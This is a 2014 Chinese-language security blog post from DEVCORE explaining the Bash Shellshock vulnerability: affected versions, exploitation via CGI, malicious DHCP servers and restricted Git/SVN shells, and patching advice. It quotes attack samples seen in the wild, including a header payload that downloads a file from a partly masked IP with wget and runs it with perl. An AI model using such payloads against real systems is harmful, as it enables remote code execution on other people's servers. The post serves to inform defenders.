
<!DOCTYPE html>
<html class="no-js " lang="zh-TW" xmlns="http://www.w3.org/1999/xhtml" xmlns:og="http://ogp.me/ns#" xmlns:fb="http://www.facebook.com/2008/fbml">
  <head>
    <title>
      Shellshock (Bash CVE-2014-6271) 威脅仍在擴大中，但無需過度恐慌 | DEVCORE 戴夫寇爾
    </title>
    <meta charset="utf-8">
    <meta content="width=device-width, initial-scale=1, maximum-scale=1" name="viewport">
    <meta name="description" property="og:description" content="Shellshock 是今年來第二波掏金潮，相較於上次 Heartbleed 駭客們的刮刮樂遊戲需要拼運氣，這次的 Shellshock 只要一發現利用點，就能馬上擁有基本的系統操作權限" />
    <meta name="keywords" content="Shellshock, CVE, Bash, Vulnerability" />
    <meta property="og:site_name" content="DEVCORE 戴夫寇爾" />
    <meta property="og:title" content="Shellshock (Bash CVE-2014-6271) 威脅仍在擴大中，但無需過度恐慌 | DEVCORE 戴夫寇爾" />
    <meta property="og:url" content="http://devco.re/blog/2014/09/30/shellshock-CVE-2014-6271/" />
    <meta property="og:type" content="website" />
    <meta property="og:image" content="https://lh5.googleusercontent.com/-REhuiuIYlf8/VCuEEjtKi8I/AAAAAAAAAso/dp99DcsbPEA/w702-h478-no/ByWDCZwIAAAjCts.jpg" />
    <meta name="twitter:card" content="summary">
    <meta name="twitter:site" content="d3vc0r3">
    <meta name="twitter:title" content="Shellshock (Bash CVE-2014-6271) 威脅仍在擴大中，但無需過度恐慌 | DEVCORE 戴夫寇爾">
    <meta name="twitter:description" content="Shellshock 是今年來第二波掏金潮，相較於上次 Heartbleed 駭客們的刮刮樂遊戲需要拼運氣，這次的 Shellshock 只要一發現利用點，就能馬上擁有基本的系統操作權限">
    <meta name="twitter:creator" content="d3vc0r3">
    <meta name="twitter:image:src" content="https://lh5.googleusercontent.com/-REhuiuIYlf8/VCuEEjtKi8I/AAAAAAAAAso/dp99DcsbPEA/w702-h478-no/ByWDCZwIAAAjCts.jpg">
    <meta name="twitter:domain" content="devco.re">
    <meta name="google-site-verification" content="lMNi_XT6UmeGqeYI_vLHu5PDRi_uNVfnA2NdDGS4-lM" />
    <meta name="msvalidate.01" content="119FDBB7730BE45B162515BBB1FF6B33" />
    <meta name="alexaVerifyID" content="j-Es9N9SD7ckfA2EokOz9SZzhok" />
    <meta name='yandex-verification' content='4561963cf1d18fe3' />

    <link rel="canonical" href="http://devco.re/blog/2014/09/30/shellshock-CVE-2014-6271/"/>
    <link rel="alternate" type="application/rss+xml" title="DEVCORE 戴夫寇爾" href="http://devco.re/rss">
    <link rel="publisher" href="https://plus.google.com/118439315679478709768/" />

    <link href="/assets/themes/devcore/images/favicon.png" rel="icon" size="32x32">
    <link href="/assets/themes/devcore/stylesheets/all.min.css" media="screen" rel="stylesheet" type="text/css" />
    <!--[if lt IE 9]><link href="/stylesheets/ie8.css" media="screen" rel="stylesheet" type="text/css" /><![endif]--><!--[if lt IE 9]><script src="//html5shim.googlecode.com/svn/trunk/html5.js" type="text/javascript"></script><![endif]-->
  </head>
  <body class="off-canvas" data-offset="48" data-spy="scroll" data-target=".quick-nav">
    <div class="wrapper">
      <div class="outside">
        <div class="page-width">
          <div class="close-menu-btn-wrapper">
            <div class="close-menu-btn-wrapper-inner">
              <a class="close-menu-btn" href="#close-menu">×</a>
            </div>
          </div>
        </div>
        <div class="outside-inner">
          <div class="main-nav" data-set="main-nav">
            <ul>
              <li>
                <a href="/services/penetration-test" title="滲透測試服務 Penetration Test">
                  <div class="zh">
                    服務
                  </div>
                  <div class="en">
                    Services
                  </div>
                </a>
                <ul>
                  <li>
                    <a href="/services/penetration-test" title="滲透測試服務 Penetration Test">
                      <div class="zh">
                        滲透測試服務
                      </div>
                      <div class="en">
                        Penetration Test
                      </div>
                    </a>
                  </li>
                  <li>
                    <a href="/services/security-training" title="資安教育訓練 Security Training">
                      <div class="zh">
                        資安教育訓練
                      </div>
                      <div class="en">
                        Security Training
                      </div>
                    </a>
                  </li>
                  <li>
                    <a href="/services/incident-response" title="資安事件處理 Incident Response">
                      <div class="zh">
                        資安事件處理
                      </div>
                      <div class="en">
                        Incident Response
                      </div>
                    </a>
                  </li>
                  <li>
                    <a href="/services/security-consulting" title="資安顧問服務 Security Consulting">
                      <div class="zh">
                        資安顧問服務
                      </div>
                      <div class="en">
                        Security Consulting
                      </div>
                    </a>
                  </li>
                  <li>
                    <a href="/services/security-seal" title="網站安全標章 Security Seal">
                      <div class="zh">
                        網站安全標章
                      </div>
                      <div class="en">
                        Security Seal
                      </div>
                    </a>
                  </li>
                </ul>
              </li>
              <li>
                <a href="/blog/" title="部落格 Blog">
                  <div class="zh">
                    部落格
                  </div>
                  <div class="en">
                    Blog
                  </div>
                </a>
                <ul>
                  <li>
                    <a href="/blog/category/%E6%9C%80%E6%96%B0%E6%B6%88%E6%81%AF/" title="最新消息 News">
                      <div class="zh">
                        最新消息
                      </div>
                      <div class="en">
                        News
                      </div>
                    </a>
                  </li>
                  <li>
                    <a href="/blog/category/%E6%A1%88%E4%BE%8B%E5%89%96%E6%9E%90/" title="案例剖析 Case Study">
                      <div class="zh">
                        案例剖析
                      </div>
                      <div class="en">
                        Case Study
                      </div>
                    </a>
                  </li>
                  <li>
                    <a href="/blog/category/%E6%8A%80%E8%A1%93%E5%B0%88%E6%AC%84/" title="技術專欄 Technical">
                      <div class="zh">
                        技術專欄
                      </div>
                      <div class="en">
                        Technical
                      </div>
                    </a>
                  </li>
                  <li>
                    <a href="/blog/category/%E7%A7%91%E6%99%AE%E6%96%87%E7%AB%A0/" title="科普文章 For Muggle">
                      <div class="zh">
                        科普文章
                      </div>
                      <div class="en">
                        For Muggle
                      </div>
                    </a>
                  </li>
                </ul>
              </li>
              <li>
                <a href="/about/" title="關於 About">
                  <div class="zh">
                    關於
                  </div>
                  <div class="en">
                    About
                  </div>
                </a>
              </li>
              <li>
                <a href="/contact/" title="聯絡 Contact">
                  <div class="zh">
                    聯絡
                  </div>
                  <div class="en">
                    Contact
                  </div>
                </a>
              </li>
              <li>
                <a href="/partners/" title="合作夥伴 Partners">
                  <div class="zh">
                    合作夥伴
                  </div>
                  <div class="en">
                    Partners
                  </div>
                </a>
              </li>
            </ul>
          </div>
        </div>
      </div>
      <div class="page">
        <div class="header">
          <div class="header-inner">
            <div class="main-nav" data-set="main-nav">
              <ul>
                <li>
                  <a href="/services/penetration-test" title="滲透測試服務 Penetration Test">Services</a>
                </li>
                <li>
                  <a href="/blog/" title="部落格 Blog">Blog</a>
                </li>
                <li>
                  <a href="/about/" title="關於 About">About</a>
                </li>
                <li>
                  <a href="/contact/" title="聯絡 Contact">Contact</a>
                </li>
                <li>
                  <a href="/partners/" title="合作夥伴 Partners">Partners</a>
                </li>
                <li class="menu-button">
                  <a class="open-menu-btn" href="#open-menu">・・・</a>
                </li>
              </ul>
            </div>
            <h1 class="logo">
              <a href="/" title="DEVCORE 戴夫寇爾">Shellshock (Bash CVE-2014-6271) 威脅仍在擴大中，但無需過度恐慌</a>
            </h1>
          </div>
        </div>
        <div class="main">
          

          <div class="page-header">
            <div class="container">
              <h2 class="page-header-title">
                部落格 <small> Blog </small>
              </h2>
            </div>
          </div>
          <div class="page-content">
            <div class="container">
              <div class="post">
                <div class="post-main">
                  <div class="post-switch">
                    <a class="prev" href="/blog/2014/09/24/security-of-ip-camera-and-nvr/" title="網路攝影機、DVR、NVR 的資安議題 - 你知道我在看你嗎？">上一篇文章</a>
                    <a class="next" href="/blog/2014/10/13/android-webview-left-shortcuts-for-hacker/" title="Android WebView 為你的使用者打開了漏洞之門你知道嗎？">下一篇文章</a>
                  </div>
                  <div itemscope itemtype="http://schema.org/Article" class="post-content">
                    <h2 itemprop="name" class="post-title">
                      Shellshock (Bash CVE-2014-6271) 威脅仍在擴大中，但無需過度恐慌
                    </h2>
                    <div class="post-info">
                      
                      
                      
<span class="post-category"><a href="/blog/category/技術專欄/" title="技術專欄">技術專欄</a></span><span class="posted">Posted </span>by <a class="poster" href="/blog/author/shaolin"><span itemprop="author" itemscope itemtype="http://schema.org/Person"><span itemprop="name">Shaolin</span></span></a>on <span class="post-time" itemprop="datePublished" content="2014-09-30">2014-09-30</span>


                    </div>
                    <div class="post-tag">
                      
                      Tags: <a href="/blog/tag/CVE/">CVE</a>, <a href="/blog/tag/Shell/">Shell</a>, <a href="/blog/tag/Vulnerability/">Vulnerability</a>
                    </div>
                    <span itemprop="articleBody">
                      
<p><a href="https://lh5.googleusercontent.com/-REhuiuIYlf8/VCuEEjtKi8I/AAAAAAAAAso/dp99DcsbPEA/w702-h478-no/ByWDCZwIAAAjCts.jpg"><img src="https://lh5.googleusercontent.com/-REhuiuIYlf8/VCuEEjtKi8I/AAAAAAAAAso/dp99DcsbPEA/w702-h478-no/ByWDCZwIAAAjCts.jpg" alt="ShellShocked" title="ShellShocked" /></a>
[ Ref: <a href="https://twitter.com/SynAckPwn/status/514961810320293888/photo/1">OMG ΉΆXOR(twitter)</a>]</p>

<p>自 9/24 以來，不少資訊圈朋友日以繼夜的忙碌，這都多虧了藏在 Bash 裡 22 年的安全漏洞－<a href="https://en.wikipedia.org/wiki/Shellshock_%28software_bug%29">Shellshock</a> (Bash CVE-2014-6271)。對於惡意攻擊者而言，這是今年來第二波淘金潮，相較於上次 <a href="http://devco.re/blog/2014/04/09/openssl-heartbleed-CVE-2014-0160/">Heartbleed</a> 駭客們的刮刮樂遊戲需要拼運氣，這次的 Shellshock 只要一發現利用點，就能馬上擁有基本的系統操作權限，也難怪 <a href="http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-6271">NVD</a> 給予 Shellshock 最嚴重的 10.0 分影響等級。</p>

<!-- more -->

<p>Shellshock 受影響的 Bash 版本如下：</p>

<ul>
  <li>Bash 4.3 Patch 25 （含）以前版本</li>
  <li>Bash 4.2 Patch 48 （含）以前版本</li>
  <li>Bash 4.1 Patch 12 （含）以前版本</li>
  <li>Bash 4.0 Patch 39 （含）以前版本</li>
  <li>Bash 3.2 Patch 52 （含）以前版本</li>
  <li>Bash 3.1 Patch 18 （含）以前版本</li>
  <li>Bash 3.0 Patch 17 （含）以前版本</li>
  <li>Bash 2.0.5b Patch 8 （含）以前版本</li>
  <li>Bash 1.14.7 （含）以前版本</li>
</ul>

<p>這次的問題出在 bash 對環境變數的解析上。若有辦法在環境變數中塞入惡意的程式碼，並且順利將這些環境變數傳入 bash，bash 就會因解析錯誤而執行惡意指令、和讓攻擊者能直接對系統進行基本的操作。原始碼及更進階的原理請參考<a href="http://blog.erratasec.com/2014/09/the-shockingly-bad-code-of-bash.html">這篇</a>。Shellshock 之所以嚴重，一來是因為攻擊語法相當簡單，只需要一行指令，就可以直接對系統進行操作；二來是因為 bash 使用範圍極廣，多款作業系統預設 shell 就是 bash。 常見的作業系統與其預設 shell 整理如下：</p>

<table>
  <thead>
    <tr>
      <th style="text-align: left">作業系統</th>
      <th style="text-align: left">預設 shell</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align: left">CentOS</td>
      <td style="text-align: left"><font color="red">bash</font></td>
    </tr>
    <tr>
      <td style="text-align: left">Fedora</td>
      <td style="text-align: left"><font color="red">bash</font></td>
    </tr>
    <tr>
      <td style="text-align: left">RHEL</td>
      <td style="text-align: left"><font color="red">bash</font></td>
    </tr>
    <tr>
      <td style="text-align: left">Mac OS X</td>
      <td style="text-align: left"><font color="red">bash</font></td>
    </tr>
    <tr>
      <td style="text-align: left">Android</td>
      <td style="text-align: left">早期是 ash, 3.0 開始是 mksh</td>
    </tr>
    <tr>
      <td style="text-align: left">Debian</td>
      <td style="text-align: left">sh (Lenny, 5.0)<br />dash (Squeeze, 6.0)</td>
    </tr>
    <tr>
      <td style="text-align: left">embedded device</td>
      <td style="text-align: left">大部分使用 busybox (ash)</td>
    </tr>
    <tr>
      <td style="text-align: left">FreeBSD</td>
      <td style="text-align: left">tcsh</td>
    </tr>
    <tr>
      <td style="text-align: left">Ubuntu</td>
      <td style="text-align: left">dash</td>
    </tr>
    <tr>
      <td style="text-align: left">iOS</td>
      <td style="text-align: left">Jailbreak 後是 bash</td>
    </tr>
  </tbody>
</table>

<p><br />
我們看到近半數知名的 un*x 系統預設使用 bash，可以推想這次影響範圍有多廣，尤其是許多服務都架構在這之上，若遭受到攻擊，損失的可能是企業的機密資料或客戶資料。至於沒有預設使用 bash 的作業系統，也並不意味著完全沒有風險，例如 Ubuntu 在 DHCP 客戶端使用到 bash ，就仍然會有風險，下面文章中也會提到這樣的狀況。另外，早期新聞中常出現物聯網設備會受此漏洞影響的報導，經過我們實測，物聯網設備為求精簡，大多使用 busybox，而其 shell 為 ash，故大多數設備在這次 Shellshock 威脅中影響不大，不過儘管物聯網設備逃過了這次 Shellshock 事件，有許多設備仍然是<a href="http://devco.re/blog/2014/09/24/security-of-ip-camera-and-nvr/">赤裸裸</a>的。</p>

<h3 id="shellshock-">常見的 Shellshock 利用方式</h3>

<p>Shellshock 漏洞被公布後，惡意攻擊者無不想要透過這個漏洞對伺服器進行遠端攻擊，一些遠端攻擊概念也陸續被證實。最早的<a href="http://blog.erratasec.com/2014/09/bash-shellshock-scan-of-internet.html">公開大量掃描</a>是由 Errata Security 在其部落格公布技術細節，他們在 HTTP 請求表頭中的 Cookie、Host、Referer 中放置惡意語法 <code>() { :; }; ping -c 3 209.126.230.74</code>，並且利用 masscan 對全世界 HTTP 伺服器 (port 80) 進行掃描。因為一般伺服器會將 HTTP 表頭中之內容放入環境變數中，若伺服器首頁入口程式本身是 bash shell script 或者其子程序有呼叫到 bash，就會受到惡意語法的影響，執行 <code>ping -c 3 209.126.230.74</code> 指令。</p>

<h4 id="cgi-">攻擊使用 CGI 的網頁伺服器</h4>

<p>利用同樣的道理，惡意攻擊者開始在 HTTP 表頭中置入惡意的語法，大量去掃描網路上的 CGI 網頁，因為這種網頁常呼叫系統指令，所以成功機率都頗高，攻擊成功的結果如下圖，從這張圖也可了解這個弱點可以簡單地透過一個參數就能直接讓系統執行任意指令。</p>

<p><a href="https://lh5.googleusercontent.com/-QY_2lmgtmlQ/VCrMKHc21KI/AAAAAAAAAsM/Dj4HSgIOOKU/w878-h626-no/shellshock_cgi2.png"><img src="https://lh5.googleusercontent.com/-QY_2lmgtmlQ/VCrMKHc21KI/AAAAAAAAAsM/Dj4HSgIOOKU/w878-h626-no/shellshock_cgi2.png" alt="攻擊使用 CGI 的網頁伺服器" title="攻擊使用 CGI 的網頁伺服器" /></a></p>

<p>詳細的實作流程請參考下面影片：</p>

<center><div class="videowrapper"><iframe width="560" height="420" src="http://www.youtube.com/embed/RUsHcZi2hIU" frameborder="0"> </iframe></div></center>

<p>我們團隊也在 CGI 環境下執行幾種程式語言進行測試，發現用到以下 function 時會讀取到環境變數（date 只是範例，可代換為其他系統指令），因此若伺服器在 CGI 環境下使用這些 function，會為伺服器本身帶來嚴重風險。</p>

<table>
  <thead>
    <tr>
      <th style="text-align: left">Language</th>
      <th style="text-align: left">Vulnerable Function</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align: left">Perl</td>
      <td style="text-align: left">exec(“date &gt; /dev/null”);<br />open(SHELLSHOCK, “| date &gt; /dev/null”);<br />system(“date &gt; /dev/null;”);<br />print `date &gt; /dev/null`</td>
    </tr>
    <tr>
      <td style="text-align: left">PHP</td>
      <td style="text-align: left">exec(‘date’);<br />system(‘date’);<br />mb_send_mail();</td>
    </tr>
    <tr>
      <td style="text-align: left">Python</td>
      <td style="text-align: left">os.system(‘date’)<br />subprocess.call(‘date’, shell=True)<br />subprocess.Popen(‘date’, shell=True)</td>
    </tr>
    <tr>
      <td style="text-align: left">Ruby</td>
      <td style="text-align: left">`date`<br />exec ‘date’<br />system ‘date’</td>
    </tr>
  </tbody>
</table>

<p><br /></p>

<h4 id="dhcp-">建置惡意 DHCP 伺服器感染連線使用者</h4>

<p>同時，有另一批人發現某些作業系統在進行 DHCP 連線時，會將 DHCP 伺服器傳入的一些資訊塞入到環境變數中。於是，若建置一個惡意 DHCP 伺服器，對其連線的使用者就有很高的機會遭受攻擊。我們實際做了實驗攻擊一般使用者，在使用者建立連線的當下放置後門，實驗過程如下影片：</p>

<center><div class="videowrapper"><iframe width="560" height="420" src="http://www.youtube.com/embed/rSj1v8pFVKg" frameborder="0"> </iframe></div></center>

<p><br />
我們也分別測試了在不同作業系統下是否會受到惡意 DHCP 伺服器影響，基本上，常見的 un*x 系統開機後自動連線基本上都會中招。</p>

<table>
  <thead>
    <tr>
      <th style="text-align: left">OS</th>
      <th style="text-align: left">Version</th>
      <th style="text-align: left">Vulnerable</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align: left">CentOS</td>
      <td style="text-align: left">7.0</td>
      <td style="text-align: left"><font color="red">YES</font></td>
    </tr>
    <tr>
      <td style="text-align: left">Debian</td>
      <td style="text-align: left">7.6</td>
      <td style="text-align: left"><font color="red">YES</font></td>
    </tr>
    <tr>
      <td style="text-align: left">Fedora</td>
      <td style="text-align: left">20</td>
      <td style="text-align: left"><font color="red">YES</font></td>
    </tr>
    <tr>
      <td style="text-align: left">Ubuntu</td>
      <td style="text-align: left">10.04.1 LTS</td>
      <td style="text-align: left"><font color="red">YES</font></td>
    </tr>
    <tr>
      <td style="text-align: left">Ubuntu</td>
      <td style="text-align: left">14.04.1 LTS</td>
      <td style="text-align: left"><font color="red">YES</font></td>
    </tr>
    <tr>
      <td style="text-align: left">Android</td>
      <td style="text-align: left">4.4.4</td>
      <td style="text-align: left">NO</td>
    </tr>
    <tr>
      <td style="text-align: left">Apple iOS</td>
      <td style="text-align: left">7.0.4</td>
      <td style="text-align: left">NO</td>
    </tr>
    <tr>
      <td style="text-align: left">FreeBSD</td>
      <td style="text-align: left">10.0</td>
      <td style="text-align: left">NO</td>
    </tr>
    <tr>
      <td style="text-align: left">Gentoo</td>
      <td style="text-align: left">20140925</td>
      <td style="text-align: left">NO (已修復)</td>
    </tr>
    <tr>
      <td style="text-align: left">Linux Mint</td>
      <td style="text-align: left">17 “Qiana” Cinnamon</td>
      <td style="text-align: left">NO <sup id="fnref:note2"><a href="#fn:note2" class="footnote">1</a></sup></td>
    </tr>
    <tr>
      <td style="text-align: left">Linux Mint</td>
      <td style="text-align: left">Debian 201403 Cinnamon</td>
      <td style="text-align: left">NO <sup id="fnref:note2:1"><a href="#fn:note2" class="footnote">1</a></sup></td>
    </tr>
    <tr>
      <td style="text-align: left">Mac OS X</td>
      <td style="text-align: left">10.9.5</td>
      <td style="text-align: left">NO</td>
    </tr>
    <tr>
      <td style="text-align: left">openSUSE</td>
      <td style="text-align: left">13.2</td>
      <td style="text-align: left">NO <sup id="fnref:note1"><a href="#fn:note1" class="footnote">2</a></sup></td>
    </tr>
    <tr>
      <td style="text-align: left">Synology</td>
      <td style="text-align: left">5.0-4493 update 7</td>
      <td style="text-align: left">NO (已修復)</td>
    </tr>
  </tbody>
</table>

<p><br /></p>

<h4 id="gitsubversion--shell-">繞過 Git/Subversion 伺服器的 shell 限制</h4>

<p>Shellshock 也常被利用來繞過伺服器的 shell 限制，最常見的就是 Git 和 Subversion 伺服器：
通常這些伺服器允許透過 SSH 連線，但登入後都對應著受限制的 shell。透過此漏洞，可以繞過 shell 的限制，執行指令如下圖。（註：OS 中 git user 預設 shell 要為 bash 才會受到影響）</p>

<p><a href="https://lh6.googleusercontent.com/-6fJsJ1BkK6c/VCrMAm9n57I/AAAAAAAAAsE/ovEnfiijQ-g/w878-h530-no/shellshock_test_git.png"><img src="https://lh6.googleusercontent.com/-6fJsJ1BkK6c/VCrMAm9n57I/AAAAAAAAAsE/ovEnfiijQ-g/w878-h530-no/shellshock_test_git.png" alt="繞過 Git/Subversion 伺服器的 shell 限制" title="繞過 Git/Subversion 伺服器的 shell 限制" /></a></p>

<p>一般我們要實作特定使用者登入 ssh 只能做特定的事情，常常會在 sshd_config 設定 ForceCommand，或是在 authorized_keys 設定 command= 如下：</p>

<p><code>
command="[path]/gl-auth-command sitaram",[more options] ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEA18S2t...
</code></p>

<p>這次會受到 Shellshock 影響，就是因為這些設定會在使用者透過 ssh 登入時，呼叫 bash 執行，當環境變數被引入，惡意的程式碼就會被執行了。</p>

<h3 id="shellshock--1">Shellshock 威脅仍在擴大</h3>

<p>目前不管是白帽駭客或是黑帽駭客都還在持續尋找可以利用 Shellshock 的地方，如同前面所述，找到可以寫入環境變數的地方，並且順利傳入 bash 執行，就可以利用該弱點來執行更進一步的攻擊。</p>

<p>從 Shellshock 爆發至今，陸陸續續傳出了很多公司的產品受到此弱點影響，整理<a href="http://www.kb.cert.org/vuls/byvendor?searchview&amp;Query=FIELD+Reference=252743&amp;SearchOrder=4">在此</a>，也有一些 POC 整理在<a href="https://github.com/mubix/shellshocker-pocs/">這裡</a>。 其中不乏出現一些常用知名套件如：OpenVPN、Pure-FTPd，而且持續更新中。</p>

<p>現在針對 HTTP 伺服器的攻擊還是佔多數，截至目前為止我們仍持續發現網路上有各種掃描樣本，例如：</p>

<ul>
  <li>() { :;}; /bin/bash -c "echo testing9123123"; /bin/uname -a</li>
  <li>() { :;}; /bin/bash -c "wget -P /var/tmp 174.143.2XX.XX/…/x ; perl /var/tmp/x"</li>
  <li>() { :;};echo vOLniO4dcLqW2I3MnIVpSfk8bmzyxXaIF$(echo vOLniO4dcLqW2I3MnIVpSfk8bmzyxXaIF)vOLniO4dcLqW2I3MnIVpSfk8bmzyxXaIF</li>
</ul>

<p>除了這些陸續針對 HTTP 伺服器的案例，我們認為，一些公司購入的網路設備是 Shellshock 潛在高危險群，那些買來就擺在旁邊維運的設備，一來容易被忽略，二來是其更新不易，三來這些設備常使用到 bash，因此仍是現在惡意攻擊者專注研究的目標，請大家特別小心。</p>

<h3 id="section">結論：無需過度恐慌，但別掉以輕心</h3>

<p>「只要有 bash 的系統全部都是受駭範圍！」</p>

<p>不少朋友看到最近 Shellshock 的新聞報導，都十分緊張。儘管各位所使用的 bash 是含有漏洞的版本，但要成功執行攻擊手法需要許多條件，被攻擊者從遠端攻擊的機率偏低，因此大家不需要太過恐慌，只要注意以下設備或伺服器：</p>

<ul>
  <li>特定 Linux 版本，並且使用 DHCP 連線</li>
  <li>網路、資安設備</li>
  <li>使用 CGI 的網站伺服器</li>
  <li>已經公布含有弱點的套件</li>
</ul>

<p>那我們該怎麼自保呢？在攻擊手法不斷精進之下，只過濾 CVE-2014-6271 的攻擊字串並沒有辦法完全阻擋攻擊。建議可以先將伺服器的 bash 升級至最新版本，並持續關注後續更新訊息（目前持續有繞過檢查的新 CVE 弱點發佈），使用 CGI 之伺服器搭配 iptables、IDS、Mod Security 等機制偵測攻擊特徵並將其阻擋。若有設備在這次的影響範圍，也記得向原廠索取更新程式。</p>

<h3 id="section-1">題外話</h3>

<p>有人說：「Linux 在 2014 年接連出包，真是一個不安全的作業系統！反觀 Windows 在這幾次都毫無影響，企業應該要全面改用 Microsoft Solution！」，但這真的是正確的想法嗎？其實一個 OpenSource 的系統、軟體，可以藉由社群的力量檢視原始碼的問題，集合眾人的力量讓系統變得更加安全。因此有被揭露出漏洞，對於一個系統來說是好事。而非 OpenSource 的系統，就只能仰賴原廠自己的資安團隊進行研究，或者是外部資安人員的發掘了。選擇作業系統的原則，最好依照系統的功能需求、產品定位、安全漏洞的修補速度等層面，才能夠選用真正符合自己需要的系統。</p>

<h3 id="section-2">註解</h3>

<div class="footnotes">
  <ol>
    <li id="fn:note2">
      <p>若手動執行 dhclient，則會遭到漏洞影響。 <a href="#fnref:note2" class="reversefootnote">&#8617;</a> <a href="#fnref:note2:1" class="reversefootnote">&#8617;<sup>2</sup></a></p>
    </li>
    <li id="fn:note1">
      <p>系統環境變數會受到影響，但無法被攻擊者利用。 <a href="#fnref:note1" class="reversefootnote">&#8617;</a></p>
    </li>
  </ol>
</div>

                    </span>
                    
                    <div class="author-area">
                      <h4 class="page-content-title page-content-title-with-line">
                        <span>作者資訊</span>
                      </h4>

                      <div class="author" style="overflow: hidden; margin-bottom: 30px;">
                        <div class="authoe-avatar" style="float: left; width: 160px;">
                          <img src="/assets/themes/devcore/images/avatar/shaolinhsu.jpg" style="margin: 0px auto; " alt="Shaolin" title="Shaolin" />
                        </div>
                        <div class="authoe-desc" style="margin-left: 200px;">
                          <h4 class="author-name">
                            <a href="/blog/author/shaolin">Shaolin</a>
                          </h4>
                          <div class="author-role">
                            Security Reseacher
                          </div>
                          <div class="author-intro">
                            喜愛資訊技術、喜歡跟別人走不一樣的路。有一點點智障的熱血人，期望能利用資訊的力量對世界有所貢獻。
                          </div>
                        </div>
                      </div>
                    </div>
                    
                    <div class="post-switch">
                      <a class="prev" href="/blog/2014/09/24/security-of-ip-camera-and-nvr/" title="網路攝影機、DVR、NVR 的資安議題 - 你知道我在看你嗎？">上一篇文章</a>
                      <a class="next" href="/blog/2014/10/13/android-webview-left-shortcuts-for-hacker/" title="Android WebView 為你的使用者打開了漏洞之門你知道嗎？">下一篇文章</a>
                    </div>
                    <div class="social-share" style="line-height: 10px; margin: 20px 0;">
                      <div style="float: right;">
                        <div class="fb-like" data-href="http://devco.re/blog/2014/09/30/shellshock-CVE-2014-6271/" data-layout="button_count" data-action="like" data-show-faces="false" data-share="false"></div>
                      </div>
                      <a href="#" style="dispaly:none; border-bottom:none;"> </a>
                      <a href="https://twitter.com/share?" class="twitter-share-button">Tweet</a>
                      <div class="g-plusone" data-size="medium"></div>
                      <script type="text/javascript">
                        (function() {
                          var po = document.createElement('script'); po.type = 'text/javascript'; po.async = true;
                          po.src = 'https://apis.google.com/js/platform.js';
                          var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(po, s);
                        })();
                      </script>
                      <script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0],p=/^http:/.test(d.location)?'http':'https';if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src=p+'://platform.twitter.com/widgets.js';fjs.parentNode.insertBefore(js,fjs);}}(document, 'script', 'twitter-wjs');</script>
                    </div>
                  </div>
                  


  <div id="disqus_thread"></div>
<script type="text/javascript">
    var disqus_developer = 1;
    var disqus_shortname = 'd3vc0r3'; // required: replace example with your forum shortname
    
    /* * * DON'T EDIT BELOW THIS LINE * * */
    (function() {
        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
        dsq.src = 'http://' + disqus_shortname + '.disqus.com/embed.js';
        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
<a href="http://disqus.com" class="dsq-brlink">blog comments powered by <span class="logo-disqus">Disqus</span></a>




                </div>
                <div class="post-sidebar">
                  <!--文章分類-->
                  <div class="widget">
                    <div class="widget-title">
                      文章分類
                    </div>
                    <ul class="widget-list">
                      
                                        
                    
                      <li>
                        <a href="/blog/category/最新消息/">最新消息 <span class="count">(2)</span></a>
                      </li>
                    
                      <li>
                        <a href="/blog/category/案例剖析/">案例剖析 <span class="count">(9)</span></a>
                      </li>
                    
                      <li>
                        <a href="/blog/category/技術專欄/">技術專欄 <span class="count">(18)</span></a>
                      </li>
                    
                      <li>
                        <a href="/blog/category/科普文章/">科普文章 <span class="count">(5)</span></a>
                      </li>
                    
                      <li>
                        <a href="/blog/category/資安新聞/">資安新聞 <span class="count">(1)</span></a>
                      </li>
                    
                  
                      <li>
                        <a href="/blog/archive"><div class="widget-list-title">所有文章列表 »</div></a>
                      </li>
                      <li>
                        <gcse:search></gcse:search>
                      </li>

                    </ul>
                  </div>
                  <!--文章分類 end--><!--最新文章-->
                  <div class="widget">
                    <div class="widget-title">
                      最新文章
                    </div>
                    <ul class="widget-list">
                        
                      <li>
                        <a href="/blog/2016/12/26/a-look-into-the-growth-of-IoT-DDoS-attacks/">
                          <div class="widget-list-title">
                            IoT設備商別成為幫兇 從Dyn DDoS攻擊事件看IoT安全
                          </div>
                          <div class="widget-list-date">
                            2016-12-26
                          </div>
                        </a>
                      </li>
  
                      <li>
                        <a href="/blog/2016/09/22/advisory-accellion-file-transfer-appliance-vulnerability-eng-ver/">
                          <div class="widget-list-title">
                            Advisory: Accellion File Transfer Appliance Vulnerability
                          </div>
                          <div class="widget-list-date">
                            2016-09-22
                          </div>
                        </a>
                      </li>
  
                      <li>
                        <a href="/blog/2016/09/22/advisory-accellion-file-transfer-appliance-vulnerability/">
                          <div class="widget-list-title">
                            Accellion File Transfer Appliance 弱點報告
                          </div>
                          <div class="widget-list-date">
                            2016-09-22
                          </div>
                        </a>
                      </li>
  
                      <li>
                        <a href="/blog/2016/07/29/the_security_dilemma_of_e-commerce/">
                          <div class="widget-list-title">
                            電商業者的資安困境？
                          </div>
                          <div class="widget-list-date">
                            2016-07-29
                          </div>
                        </a>
                      </li>
  
                      <li>
                        <a href="/blog/2016/04/21/how-I-hacked-facebook-and-found-someones-backdoor-script-eng-ver/">
                          <div class="widget-list-title">
                            How I Hacked Facebook, and Found Someone's Backdoor Script
                          </div>
                          <div class="widget-list-date">
                            2016-04-21
                          </div>
                        </a>
                      </li>
  
                      <li>
                        <a href="/blog/2016/04/21/how-I-hacked-facebook-and-found-someones-backdoor-script/">
                          <div class="widget-list-title">
                            滲透 Facebook 的思路與發現
                          </div>
                          <div class="widget-list-date">
                            2016-04-21
                          </div>
                        </a>
                      </li>
  
                      <li>
                        <a href="/blog/2015/08/19/devcore-2015-recruit/">
                          <div class="widget-list-title">
                            [已結束] DEVCORE 徵求行政出納人才
                          </div>
                          <div class="widget-list-date">
                            2015-08-19
                          </div>
                        </a>
                      </li>
  
                      <li>
                        <a href="/blog/2015/07/24/the-vulnerability-of-dynamic-render-paths-in-rails/">
